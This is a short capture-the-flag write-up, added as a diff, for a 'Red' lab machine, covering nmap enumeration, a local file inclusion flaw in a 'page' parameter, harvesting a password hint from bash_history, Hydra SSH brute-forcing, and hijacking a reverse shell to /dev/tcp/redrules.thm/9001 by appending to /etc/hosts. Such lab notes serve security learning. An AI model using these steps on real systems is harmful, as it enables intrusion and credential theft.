@@ -1,0 +1,66 @@
+Red is L33t(red vs blue)
+
+1. Enumeration
+
+- NMAP scan:
+	PORT      STATE    SERVICE VERSION
+	22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
+	|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
+	|_  256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
+	80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
+	| http-title: Atlanta - Free business bootstrap template
+	|_Requested resource was /index.php?page=home.html
+	|_http-server-header: Apache/2.4.41 (Ubuntu)
+	5048/tcp  filtered texai
+	24671/tcp filtered unknown
+	26726/tcp filtered unknown
+	29583/tcp filtered unknown
+	
+	- Not interesting
+
+
+
+- Website's source code:
+	* /index.php /about /services /portfolio /contact :
+		- Nothing interesting in source code
+	* !! possible attack vector
+		- http://10.113.140.72/index.php?page=home.html
+		  page query parameter loads pages, possible LFI.
+			  !!! "page" query parameter is vulnerable for LFI !!!
+			  page=file://[PATH]
+
+- Identified users from /etc/passwd:
+	* red
+	* blue
+	
+- /home/blue/.bash_history contents:
+	echo "Red rules" 
+	cd 
+	hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt 
+	cat passlist.txt 
+	rm passlist.txt 
+	sudo apt-get remove hashcat -y 
+	
+	- /home/blue/.reminder contents:
+		sup3r_p@s$w0rd!
+		
+2. Exploitation
+
+- Generate passlists for blue using the command above, special word and rules
+
+- Bruteforce passwords for SSH using Hydra
+
+- Preventing being kicked out by creating tmux session
+
+3. Post-Exploitation
+
+- I installed pspy64 to see some processes running and found the interesting one
+	* CMD: UID=1001  PID=2585   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
+		- Here I need to change redrules.thm ip address to my local machine's.
+		- /etc/hosts is world writable but has append only attribute
+			- So I appended my ip and the hostname, waited a bit and got reverse shell
+			!!! Second flag !!!
+
+
